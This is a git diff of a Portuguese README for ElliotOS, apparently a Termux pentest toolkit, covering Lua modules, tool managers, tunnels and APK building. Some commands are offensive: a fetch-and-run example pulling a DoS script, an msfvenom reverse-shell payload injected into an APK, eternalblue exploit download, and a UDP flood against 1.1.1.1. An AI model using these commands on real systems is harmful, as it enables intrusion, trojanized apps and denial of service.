+ivar.debug(true)    -- ativa
+x = 10              -- stderr: [ivar:debug] !1 → x
+y = 20              -- stderr: [ivar:debug] !2 → y
+ivar.debug(false)   -- desativa
 ```
 
 Persistência: estado salvo em `~/.elliot_ivar.cfg`. Resetado automaticamente a cada reinstalação para garantir que o ivar inicie ativo.
@@ -981,7 +1109,7 @@ ms.check()                   -- self-test: verifica todos os módulos
 ms.check('v')                -- self-test verbose
 ms.force()                   -- stress test real de todos os módulos
 ms.alias(nome, fn)           -- cria alias global no REPL
-ms.help()                    -- ajuda do módulo ms
+ms.help()
 ```
 
 ---
@@ -1000,15 +1128,14 @@ string.islower(s)               string.isupper(s)
 string.isspace(s)
 
 -- Transformação
-string.trim(s)                  string.ltrim(s)        string.rtrim(s)
+string.trim(s)                  string.ltrim(s)                string.rtrim(s)
 string.lower(s)                 string.upper(s)
-string.capitalize(s)            string.title(s)        string.swapcase(s)
+string.capitalize(s)            string.title(s)                string.swapcase(s)
 string.slugify(s)               string.truncate(s, n [,suf])
-string.repeat_str(s, n)         string.removeprefix(s, pre)
-string.removesuffix(s, suf)
+string.repeat_str(s, n)         string.removeprefix(s, pre)    string.removesuffix(s, suf)
 
 -- Divisão / junção
-string.split(s [,sep])          string.lines(s)        string.words(s)
+string.split(s [,sep])          string.lines(s)                string.words(s)
 string.partition(s, sep)        string.rpartition(s, sep)
 
 -- Alinhamento / padding
@@ -1022,7 +1149,7 @@ string.encode_url(s)            string.decode_url(s)
 string.escape_html(s)           string.unescape_html(s)
 string.interpolate(s, t)        -- ex: string.interpolate("Ola {nome}", {nome="Mike"})
 
-string.help()                   -- ajuda do módulo
+string.help()
 ```
 
 ---
@@ -1062,7 +1189,7 @@ util.printf(fmt, ...)            -- printf formatado
 util.pp(v)                       -- pretty-print de qualquer valor
 util.func(mod)                   -- lista funções de qualquer módulo ou tabela
 
-util.help()                      -- ajuda do módulo
+util.help()
 ```
 
 **`util.func` — inspetor de módulos:**
@@ -1070,7 +1197,6 @@ util.help()                      -- ajuda do módulo
 util.func(math)        -- lista todas as funções do math.*
 util.func('socket')    -- carrega e inspeciona módulo luarocks
 util.func(net)         -- inspeciona módulos do ElliotOS
-util.func(mind)        -- qualquer tabela/módulo desconhecido
 ```
 
 Detecta nomes dos parâmetros via `debug.getinfo` para funções Lua puras. Funções C são marcadas com `[C]`.
@@ -1082,6 +1208,15 @@ Detecta nomes dos parâmetros via `debug.getinfo` para funções Lua puras. Fun�
 ```lua
 json.encode(v)   -- Lua → JSON string (nil→"null", bool, number, string, table)
 json.decode(s)   -- JSON string → Lua value
+```
+
+**Exemplo:**
+```lua
+local t = {nome="Mike", porta=443, ativo=true}
+local s = json.encode(t)
+print(s)             -- {"ativo":true,"nome":"Mike","porta":443}
+local r = json.decode(s)
+print(r.nome)        -- Mike
 ```
 
 ---
@@ -1103,31 +1238,59 @@ ic()   -- exibe logo PNG via timg (requer timg instalado)
 
 ---
 
+## `net.import` — atualizado
+
+Baixa e executa scripts remotos diretamente no ElliotOS. Aceita um segundo argumento `mode` para escolher como o script será executado:
+
+```lua
+net.import(url)          -- mode 0 (padrão): executa com ms -f (linguagem ElliotOS)
+net.import(url, 0)       -- idem
+net.import(url, 1)       -- executa como Lua puro via luar (sem extensões ElliotOS)
+```
+
+**Retorno:**
+- Sucesso: `true`
+- Falha: `false, "mensagem de erro detalhada"`
+
+**Verificando erros:**
+```lua
+local ok, err = net.import("https://raw.githubusercontent.com/.../script.ms")
+if not ok then
+    print("Erro:", err)
+end
+```
+
+**Exemplos:**
+```lua
+-- Script ElliotOS (.ms) — usa ms -f
+net.import("https://raw.githubusercontent.com/mikeelliot218/Scripts-ElliotOS/main/DoS-Simple.lua")
+
+-- Módulo Lua puro — usa luar (sem acesso a net.*, mod.*, etc.)
+net.import("https://exemplo.com/modulo.lua", 1)
+```
+
+> O script é baixado para um arquivo temporário em `$TMPDIR` (Termux define automaticamente) e executado pelo binário apropriado. O arquivo temporário é removido ao terminar.
+
+---
+
 ## xtun — Tunnel Toolkit
 
 Ferramenta standalone compilada em C para criação de túneis TCP e UDP, sem root, sem dependências externas.
 
 ```bash
-# Local forward (como ssh -L)
-xtun -L [bind:]lport:rhost:rport
-
-# Reverse forward (como ssh -R)
-xtun -R [bind:]lport:rhost:rport
-
-# Forward UDP (datagrama, sem conexão)
-xtun -U [bind:]lport:rhost:rport
-
-# Modo listener cru (proxy TCP simples)
-xtun -l porta
+xtun -L [bind:]lport:rhost:rport   # Local forward (como ssh -L)
+xtun -R [bind:]lport:rhost:rport   # Reverse forward (como ssh -R)
+xtun -U [bind:]lport:rhost:rport   # Forward UDP (datagrama, sem conexão)
+xtun -l porta                       # Modo listener cru (proxy TCP simples)
 ```
 
-Útil para expor portas locais (servidores Love2D/LAN, painéis web) para fora do device sem root.
+Útil para expor portas locais (servidores, painéis web) para fora do device sem root.
 
 ---
 
 ## appforge — HTML/CSS/JS para APK
 
-O `appforge` converte qualquer projeto web local em um APK Android funcional, **sem root, sem Android Studio, sem PC**. Não vem instalado por padrão — é uma ferramenta do XPM:
+O `appforge` converte qualquer projeto web local em um APK Android funcional, **sem root, sem Android Studio, sem PC**. Não vem instalado por padrão:
 
 ```bash
 xpm install appforge
@@ -1140,28 +1303,15 @@ xpm install appforge
 ├── style.css
 └── script.js
 
-# Analisar o projeto antes de compilar
-appforge check ./meuapp/
-
-# Gerar APK básico
-appforge build ./meuapp/
-
-# Com nome, ícone e permissões
+appforge check ./meuapp/                    # analisa antes de compilar
+appforge build ./meuapp/                    # APK básico
 appforge build ./meuapp/ --name "Meu App" --pkgname com.meuapp --perm camera,mic --fullscreen
-
-# Converter um site remoto em APK
-appforge build --url https://exemplo.com --name "Meu Site"
-
-# Gerar template de projeto
-appforge template basic    # HTML + CSS + JS básico
-appforge template game     # Jogo Snake funcional
-appforge template pwa      # PWA com suporte offline
-
-# Manual
-appforge --man
+appforge build --url https://exemplo.com --name "Meu Site"   # site remoto → APK
+appforge template basic                     # gera template HTML + CSS + JS básico
+appforge template game                      # gera template jogo Snake funcional
+appforge template pwa                       # gera template PWA com suporte offline
+appforge --man                              # manual completo
 ```
-
-### Opções principais do `appforge build`
 
 | Opção | Descrição |
 |-------|-----------|
@@ -1182,30 +1332,21 @@ O `ms -ba` instala o **Arch Linux ARM** dentro do Termux via proot e configura o
 
 ```bash
 ms -ba
+archlinux          # entra no container como root
 ```
 
-### Suporte
-
-| Modo | NetHunter | BlackArch |
-|------|-----------|-----------|
-| CLI  | ✓         | ✓         |
-| GUI (XFCE4/VNC) | ✓ | ✗ (não suportado em proot) |
-
-### Acessar o container
-
 ```bash
-archlinux          # entra no Arch Linux ARM como root
-```
-
-### Instalar ferramentas BlackArch
-
-```bash
-# Dentro do container (archlinux):
+# Dentro do container:
 pacman -S nmap sqlmap burpsuite
-pacman -Sg blackarch            # lista todos os grupos
+pacman -Sg blackarch              # lista todos os grupos
 pacman -Sg blackarch-scanner
 pacman -Sg blackarch-exploitation
 ```
+
+| Modo | CLI | GUI (XFCE4/VNC) |
+|------|-----|-----------------|
+| NetHunter | ✓ | ✓ |
+| BlackArch | ✓ | ✗ (não suportado em proot) |
 
 ---
 
@@ -1214,20 +1355,20 @@ pacman -Sg blackarch-exploitation
 O `xpm` instala ferramentas de segurança **sem usar o repositório do Termux**. Tudo é compilado do código-fonte ou instalado via pip/go/cargo diretamente.
 
 ```bash
-xpm search list            # ver todas as ferramentas disponíveis
-xpm search nmap            # buscar ferramenta específica
-xpm install sqlmap         # instalar
-xpm install sqlmap nikto dirsearch nmap  # instalar várias
-xpm list                   # ver o que está instalado
-xpm update sqlmap          # atualizar ferramenta específica
-xpm upgrade                # atualizar tudo (respeita pins)
-xpm remove sqlmap          # remover
-xpm info <ferramenta>      # detalhes + versão instalada
-xpm categories             # categorias disponíveis
-xpm stats                  # estatísticas completas com versões
-xpm cache                  # conteúdo e tamanho do cache
-xpm clean                  # limpar cache
-xpm doctor                 # diagnóstico e correções do ambiente
+xpm search list                    # ver todas as ferramentas disponíveis
+xpm search nmap                    # buscar ferramenta específica
+xpm install sqlmap                 # instalar
+xpm install sqlmap nikto dirsearch # instalar várias de uma vez
+xpm list                           # ver o que está instalado
+xpm update sqlmap                  # atualizar ferramenta específica
+xpm upgrade                        # atualizar tudo (respeita pins)
+xpm remove sqlmap                  # remover
+xpm info <ferramenta>              # detalhes + versão instalada
+xpm categories                     # categorias disponíveis
+xpm stats                          # estatísticas completas com versões
+xpm cache                          # conteúdo e tamanho do cache
+xpm clean                          # limpar cache
+xpm doctor                         # diagnóstico e correções do ambiente
 ```
 
 ### Pins — travar versão de uma ferramenta
@@ -1238,16 +1379,6 @@ xpm pin sqlmap nikto       # trava várias de uma vez
 xpm unpin sqlmap           # libera para atualização
 xpm upgrade                # ferramentas pinadas são ignoradas com aviso
 ```
-
-Útil quando uma atualização quebra compatibilidade com um script ou exploit em uso. O `xpm stats` e `xpm info` mostram quais ferramentas estão pinadas e em qual versão.
-
-### Rastreamento de versão
-
-A partir da v1.5.0, o `xpm` rastreia automaticamente a versão de cada ferramenta instalada. O `xpm info` mostra a versão detectada na instalação e `xpm stats` lista todas as ferramentas com suas versões e datas. Ferramentas com versão detectável exibem o diff antes/depois no `xpm update` (`1.2.3 → 1.3.0`).
-
-### Pré-requisitos de sistema automáticos
-
-Ferramentas como `impacket`, `pwntools`, `ropper`, `binwalk`, `wfuzz` e `dnsrecon` instalam automaticamente as dependências de sistema necessárias antes de rodar o pip, sem intervenção manual.
 
 ### Ferramentas disponíveis no XPM
 
@@ -1276,15 +1407,9 @@ Ferramentas como `impacket`, `pwntools`, `ropper`, `binwalk`, `wfuzz` e `dnsreco
 ## msfvenom — Payload em APK com template
 
 ```bash
-# Passo 1 — instalar as ferramentas
 xpm install apkfull apkeditor metasploit
-
-# Passo 2 — configurar o ambiente
 xpm doctor
-```
 
-```bash
-# Gerar payload e injetar em APK template
 msfvenom -p android/meterpreter/reverse_tcp \
   LHOST=192.168.1.10 LPORT=4444 \
   -x /caminho/template.apk \
@@ -1296,26 +1421,21 @@ msfvenom -p android/meterpreter/reverse_tcp \
 ## LPM — Gerenciador de Pacotes Lua
 
 ```bash
-# Instalar módulo do LuaRocks (fallback automático: lux/GitHub)
-lpm install luasocket
-
-# Forçar por fonte específica
-lpm install --from lux luasocket
+lpm install luasocket                      # instala módulo (fallback automático: lux/GitHub)
+lpm install --from lux luasocket           # forçar fonte
 lpm install --from luarocks luasocket
-
-# Remover / listar
 lpm remove luasocket
 lpm list
 
-# Buscar exploits
-lpm --script -s eternalblue
+# Buscar e instalar exploits
+lpm --script -s eternalblue               # busca exploit
 lpm --script -s eternalblue --source packetstorm
-lpm --script -l                        # fontes disponíveis
-lpm --script -i 3                      # baixa item 3 do último resultado
+lpm --script -l                           # fontes disponíveis
+lpm --script -i 3                         # baixa item 3 do último resultado
 lpm install --from exploit eternalblue
 ```
 
-**Fontes:** `exploit-db` (padrão), `packetstorm`, `github`  
+**Fontes:** `exploit-db` (padrão), `packetstorm`, `github`
 **Scripts baixados em:** `~/.elliot/scripts/`
 
 ---
@@ -1356,36 +1476,6 @@ ms --script nexus -- --udp 1.1.1.1 -p 53 -s 500 -t 16 -x 512
 | **3 — C no ElliotOS** | Base de C, tipos, ponteiros, memória, sockets raw, criar módulo `.so` | 27–32 |
 | **4 — Projetos reais** | Scanner completo, port scanner multi-thread, próximos passos | 33–35 |
 
-### `ms --doc` — Referência da API
-
-```bash
-ms --doc               # visão geral + comandos especiais do REPL
-ms --doc modulos       # todos os módulos
-ms --doc net           # net.*
-ms --doc mod           # mod.*
-ms --doc crypto        # crypto.*
-ms --doc sys           # sys.*
-ms --doc fs            # fs.*
-ms --doc ai            # ai.*
-ms --doc db            # db.*
-ms --doc web           # web.*
-ms --doc dow           # dow.*
-ms --doc lmod          # lmod.*
-ms --doc adb           # adb.*
-ms --doc pent          # pent.*
-ms --doc sh            # sh.*
-ms --doc cc            # cc.*
-ms --doc ui            # ui.*
-ms --doc tui           # tui.*
-ms --doc exploit       # exploit.* (REPLs de pós-exploração)
-ms --doc ell           # ell.* (encoder/decoder de scripts)
-ms --doc agent         # agent.* (agente autônomo)
-ms --doc ivar          # ivar.* (variáveis indexadas)
-ms --doc string        # string.*
-ms --doc util          # util.*
-ms --doc json          # json.*
-```
-
 ---
 
 ## Interface Gráfica (opcional)
@@ -1423,7 +1513,7 @@ rungui -l love jogo/
 
 ```
 ElliotOS/
-├── luascript.sh              # Script único de instalação (v17.0) — xpm v1.5.0
+├── luascript.sh              # Script único de instalação — xpm v1.5.0
 │   ├── libnet.c              # Biblioteca C com todos os módulos
 │   ├── Lua 5.4.8 source      # Interpretador customizado (baixado de lua.org)
 │   ├── xpm                   # Gerenciador de pentest (Bash)
